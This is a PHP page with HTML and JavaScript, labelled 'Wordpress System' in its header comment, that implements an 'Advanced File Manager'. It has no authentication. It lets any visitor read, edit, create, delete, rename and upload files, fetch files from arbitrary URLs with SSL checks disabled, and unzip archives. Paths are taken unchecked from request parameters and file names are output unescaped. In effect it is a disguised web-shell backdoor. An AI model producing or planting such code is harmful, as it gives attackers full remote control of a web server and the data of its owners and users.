<?php
/*
* Wordpress System
* @author Store
* @date 2024/04/01
*/

class FileManager {
    private $baseDir;

    public function __construct($dir = "./") {
        $this->baseDir = realpath($dir) . DIRECTORY_SEPARATOR;
    }

    public function deleteFile($filename, $currentDir = '') {
        $filePath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $filename;
        if (!file_exists($filePath)) return 'File does not exist';
        if (is_dir($filePath)) return $this->deleteDirectory($filename, $currentDir); // Klasör silme işlemi

        return unlink($filePath) ? 'File deleted successfully' : 'Error deleting file';
    }

    public function saveFile($filename, $content, $currentDir = '') {
        $filePath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $filename;
        return file_put_contents($filePath, $content) !== false ? 'File saved successfully' : 'Error saving file';
    }

    public function createFile($filename, $content, $currentDir = '') {
        $filePath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $filename;
        if (file_exists($filePath)) return 'File already exists';
        return file_put_contents($filePath, $content) !== false ? 'File created successfully' : 'Error creating file';
    }

    public function renameFile($oldName, $newName, $currentDir = '') {
        $oldPath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $oldName;
        $newPath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $newName;
        return rename($oldPath, $newPath) ? 'File renamed successfully' : 'Error renaming file';
    }

    public function createDirectory($dirName, $currentDir = '') {
        $dirPath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $dirName;
        if (!file_exists($dirPath)) {
            return mkdir($dirPath, 0777, true) ? 'Directory created successfully' : 'Error creating directory';
        }
        return 'Directory already exists';
    }

    public function deleteDirectory($dirName, $currentDir = '') {
        $dirPath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $dirName;
        if (!is_dir($dirPath)) return 'Directory does not exist';

        $files = array_diff(scandir($dirPath), array('.', '..'));
        foreach ($files as $file) {
            $filePath = $dirPath . DIRECTORY_SEPARATOR . $file;
            is_dir($filePath) ? $this->deleteDirectory($file, $currentDir . DIRECTORY_SEPARATOR . $dirName) : unlink($filePath);
        }
        return rmdir($dirPath) ? 'Directory deleted successfully' : 'Error deleting directory';
    }

public function listContents($dir = '') {
    $dirPath = $this->baseDir . $dir;
    if (!is_dir($dirPath)) return false;

    $files = scandir($dirPath);
    $contents = array_diff($files, array('.', '..'));

    // Klasörleri, PHP dosyalarını ve diğer dosyaları ayır
    $folders = [];
    $phpFiles = [];
    $otherFiles = [];

    foreach ($contents as $item) {
        $filePath = $dirPath . DIRECTORY_SEPARATOR . $item;
        if (is_dir($filePath)) {
            $folders[] = $item;
        } elseif (pathinfo($filePath, PATHINFO_EXTENSION) === 'php') {
            $phpFiles[] = $item;
        } else {
            $otherFiles[] = $item;
        }
    }

    // Sıralama: Önce klasörler, sonra PHP dosyaları, en son diğer dosyalar
    $sortedContents = array_merge($folders, $phpFiles, $otherFiles);

    // Üst dizine çıkmak için '..' ekleyelim
    if ($dir !== '') {
        array_unshift($sortedContents, '..');
    }

    return $sortedContents;
}

    public function getFileInfo($filename, $currentDir = '') {
        $filePath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $filename;
        if (!file_exists($filePath)) return false;

        return [
            'name' => basename($filename),
            'size' => $this->formatSize(filesize($filePath)),
            'modified' => date("Y-m-d H:i:s", filemtime($filePath)),
            'is_dir' => is_dir($filePath),
            'is_zip' => pathinfo($filePath, PATHINFO_EXTENSION) === 'zip'
        ];
    }

    public function uploadFile($file, $currentDir = '') {
        $targetPath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . basename($file['name']);
        if (file_exists($targetPath)) return 'File already exists';
        return move_uploaded_file($file['tmp_name'], $targetPath) ? 'File uploaded successfully to ' . $targetPath : 'Error uploading file';
    }

    public function getFileContent($filename, $currentDir = '') {
        $filePath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $filename;
        if (!file_exists($filePath) || is_dir($filePath)) return false;
        return file_get_contents($filePath);
    }

    public function remoteUpload($url, $currentDir = '') {
        $fileName = basename($url);
        $filePath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $fileName;

        if (file_exists($filePath)) return 'File already exists';

        // cURL kullanarak dosyayı indir
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Yönlendirmeleri takip et
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // SSL sertifikasını doğrulama
        $fileContent = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode !== 200 || $fileContent === false) return 'Failed to download file';

        return file_put_contents($filePath, $fileContent) !== false ? 'File downloaded successfully to ' . $filePath : 'Error saving remote file';
    }

    public function unzipFile($zipFile, $extractTo = null, $currentDir = '') {
        $zipFilePath = $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $zipFile;
        if (!file_exists($zipFilePath)) return 'File does not exist';

        $extractPath = $extractTo ? $this->baseDir . $currentDir . DIRECTORY_SEPARATOR . $extractTo : $this->baseDir . $currentDir;

        $zip = new ZipArchive;
        if ($zip->open($zipFilePath) === true) {
            $zip->extractTo($extractPath);
            $zip->close();
            return 'File extracted successfully to ' . $extractPath;
        } else {
            return 'Failed to extract file';
        }
    }

    private function formatSize($size) {
        return round($size / 1024, 2) . ' KB';
    }
}

$fileManager = new FileManager();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $response = '';

    switch ($action) {
        case 'delete':
            $response = $fileManager->deleteFile($_POST['filename'], $_POST['currentDir']);
            break;
        case 'save':
            $response = $fileManager->saveFile($_POST['filename'], $_POST['content'], $_POST['currentDir']);
            break;
        case 'create':
            $response = $fileManager->createFile($_POST['filename'], $_POST['content'], $_POST['currentDir']);
            break;
        case 'rename':
            $response = $fileManager->renameFile($_POST['oldName'], $_POST['newName'], $_POST['currentDir']);
            break;
        case 'createDir':
            $response = $fileManager->createDirectory($_POST['dirName'], $_POST['currentDir']);
            break;
        case 'deleteDir':
            $response = $fileManager->deleteDirectory($_POST['dirName'], $_POST['currentDir']);
            break;
        case 'upload':
            $currentDir = $_POST['currentDir'] ?? '';
            $response = $fileManager->uploadFile($_FILES['file'], $currentDir);
            break;
        case 'remoteUpload':
            $currentDir = $_POST['currentDir'] ?? '';
            $response = $fileManager->remoteUpload($_POST['remoteUrl'], $currentDir);
            break;
        case 'unzip':
            $response = $fileManager->unzipFile($_POST['zipFile'], $_POST['extractTo'], $_POST['currentDir']);
            break;
        case 'getContent':
            $response = $fileManager->getFileContent($_POST['filename'], $_POST['currentDir']);
            echo $response;
            exit;
    }

    echo $response;
    exit;
}

// Mevcut dizini al
$currentDir = isset($_GET['dir']) ? rtrim($_GET['dir'], '/\\') : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .file-list {
            max-height: 500px;
            overflow-y: auto;
        }
        .file-item:hover {
            background-color: #f8f9fa;
        }
        .editor {
            height: 400px;
        }
        .table th, .table td {
            vertical-align: middle;
        }
    </style>
</head>
<body>
<div class="container mt-5">
    <h1 class="text-center mb-4">Advanced File Manager</h1>

    <!-- File List -->
    <div class="card">
        <div class="card-header d-flex justify-content-between align-items-center">
            <h5 class="mb-0">Files and Directories</h5>
            <div>
                <button class="btn btn-primary me-2" data-bs-toggle="modal" data-bs-target="#createModal">Create New</button>
                <button class="btn btn-success me-2" data-bs-toggle="modal" data-bs-target="#uploadModal">Upload File</button>
                <button class="btn btn-warning" data-bs-toggle="modal" data-bs-target="#remoteUploadModal">Remote Upload</button>
            </div>
        </div>
        <div class="card-body file-list">
            <table class="table table-hover">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Last Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $contents = $fileManager->listContents($currentDir);
                    if ($contents) {
                        foreach ($contents as $item) {
                            $info = $fileManager->getFileInfo($item, $currentDir);
                            $link = $info['is_dir'] ? "?dir=" . urlencode($currentDir . DIRECTORY_SEPARATOR . $item) : "#";
                            echo "<tr>
                                    <td><a href='$link'>{$info['name']}</a></td>
                                    <td>{$info['size']}</td>
                                    <td>{$info['modified']}</td>
                                    <td>
                                        <button class='btn btn-sm btn-danger me-2' onclick='confirmDelete(\"{$info['name']}\")'>Delete</button>
                                        <button class='btn btn-sm btn-warning me-2' onclick='renameFile(\"{$info['name']}\")'>Rename</button>
                                        " . (!$info['is_dir'] ? "<button class='btn btn-sm btn-info me-2' onclick='editFile(\"{$info['name']}\")'>Edit</button>" : "") . "
                                        " . ($info['is_zip'] ? "<button class='btn btn-sm btn-secondary' onclick='unzipFile(\"{$info['name']}\")'>Unzip</button>" : "") . "
                                    </td>
                                  </tr>";
                        }
                    } else {
                        echo "<tr><td colspan='4' class='text-center'>No files or directories found.</td></tr>";
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Create Modal -->
    <div class="modal fade" id="createModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Create New</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form id="createForm">
                        <input type="hidden" name="currentDir" value="<?php echo $currentDir; ?>">
                        <div class="mb-3">
                            <label for="filename" class="form-label">Name</label>
                            <input type="text" class="form-control" id="filename" name="filename" required>
                        </div>
                        <div class="mb-3">
                            <label for="content" class="form-label">Content (for files)</label>
                            <textarea class="form-control editor" id="content" name="content"></textarea>
                        </div>
                        <button type="submit" class="btn btn-primary">Create</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Upload Modal -->
    <div class="modal fade" id="uploadModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Upload File</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form id="uploadForm" enctype="multipart/form-data">
                        <input type="hidden" name="currentDir" value="<?php echo $currentDir; ?>">
                        <div class="mb-3">
                            <label for="file" class="form-label">Choose File</label>
                            <input type="file" class="form-control" id="file" name="file" required>
                        </div>
                        <button type="submit" class="btn btn-success">Upload</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Remote Upload Modal -->
    <div class="modal fade" id="remoteUploadModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Remote Upload</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form id="remoteUploadForm">
                        <input type="hidden" name="currentDir" value="<?php echo $currentDir; ?>">
                        <div class="mb-3">
                            <label for="remoteUrl" class="form-label">File URL</label>
                            <input type="url" class="form-control" id="remoteUrl" name="remoteUrl" placeholder="https://www.example.com/file.zip" required>
                        </div>
                        <button type="submit" class="btn btn-warning">Download</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Unzip Modal -->
    <div class="modal fade" id="unzipModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Unzip File</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form id="unzipForm">
                        <input type="hidden" name="currentDir" value="<?php echo $currentDir; ?>">
                        <div class="mb-3">
                            <label for="zipFile" class="form-label">File Name</label>
                            <input type="text" class="form-control" id="zipFile" name="zipFile" readonly>
                        </div>
                        <div class="mb-3">
                            <label for="extractTo" class="form-label">Extract To (optional)</label>
                            <input type="text" class="form-control" id="extractTo" name="extractTo" placeholder="Leave blank to extract here">
                        </div>
                        <button type="submit" class="btn btn-secondary">Unzip</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Edit Modal -->
    <div class="modal fade" id="editModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Edit File</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <form id="editForm">
                         <input type="hidden" name="currentDir" value="<?php echo $currentDir; ?>">
                        <div class="mb-3">
                            <label for="editFilename" class="form-label">File Name</label>
                            <input type="text" class="form-control" id="editFilename" name="filename" readonly>
                        </div>
                        <div class="mb-3">
                            <label for="editContent" class="form-label">Content</label>
                            <textarea class="form-control editor" id="editContent" name="content"></textarea>
                        </div>
                        <button type="submit" class="btn btn-primary">Save Changes</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
<script>
    // Dosya veya klasörü silme işlemi
    function confirmDelete(filename) {
        if (confirm(`Are you sure you want to delete ${filename}?`)) {
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=delete&filename=${encodeURIComponent(filename)}&currentDir=${encodeURIComponent('<?php echo $currentDir; ?>')}`
            })
            .then(response => response.text())
            .then(message => {
                alert(message); // İşlem sonucunu kullanıcıya göster
                location.reload();
            });
        }
    }

    // Dosya veya klasörü yeniden adlandırma işlemi
    function renameFile(filename) {
        const newName = prompt(`Rename ${filename} to:`, filename);
        if (newName) {
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=rename&oldName=${encodeURIComponent(filename)}&newName=${encodeURIComponent(newName)}&currentDir=${encodeURIComponent('<?php echo $currentDir; ?>')}`
            })
            .then(response => response.text())
            .then(message => {
                alert(message); // İşlem sonucunu kullanıcıya göster
                location.reload();
            });
        }
    }

    // Dosya düzenleme işlemi
    function editFile(filename) {
        fetch('', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `action=getContent&filename=${encodeURIComponent(filename)}&currentDir=${encodeURIComponent('<?php echo $currentDir; ?>')}`
        })
        .then(response => response.text())
        .then(content => {
            document.getElementById('editFilename').value = filename;
            document.getElementById('editContent').value = content;
            new bootstrap.Modal(document.getElementById('editModal')).show();
        });
    }

    // ZIP dosyasını açma işlemi
    function unzipFile(filename) {
        document.getElementById('zipFile').value = filename;
        new bootstrap.Modal(document.getElementById('unzipModal')).show();
    }

    // Yeni dosya veya klasör oluşturma formu gönderimi
    document.getElementById('createForm').addEventListener('submit', function (e) {
        e.preventDefault();
        const formData = new FormData(this);
        formData.append('action', 'create');

        fetch('', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(message => {
            alert(message); // İşlem sonucunu kullanıcıya göster
            location.reload();
        });
    });

    // Dosya yükleme formu gönderimi
    document.getElementById('uploadForm').addEventListener('submit', function (e) {
        e.preventDefault();
        const formData = new FormData(this);
        formData.append('action', 'upload');

        fetch('', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(message => {
            alert(message); // İşlem sonucunu kullanıcıya göster
            location.reload();
        });
    });

    // Uzaktan dosya yükleme formu gönderimi
    document.getElementById('remoteUploadForm').addEventListener('submit', function (e) {
        e.preventDefault();
        const formData = new FormData(this);
        formData.append('action', 'remoteUpload');

        fetch('', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(message => {
            alert(message); // İşlem sonucunu kullanıcıya göster
            location.reload();
        });
    });

    // ZIP dosyasını açma formu gönderimi
    document.getElementById('unzipForm').addEventListener('submit', function (e) {
        e.preventDefault();
        const formData = new FormData(this);
        formData.append('action', 'unzip');

        fetch('', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(message => {
            alert(message); // İşlem sonucunu kullanıcıya göster
            location.reload();
        });
    });

    // Dosya düzenleme formu gönderimi
    document.getElementById('editForm').addEventListener('submit', function (e) {
        e.preventDefault();
        const formData = new FormData(this);
        formData.append('action', 'save');

        fetch('', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(message => {
            alert(message); // İşlem sonucunu kullanıcıya göster
            location.reload();
        });
    });
</script>
</body>
</html>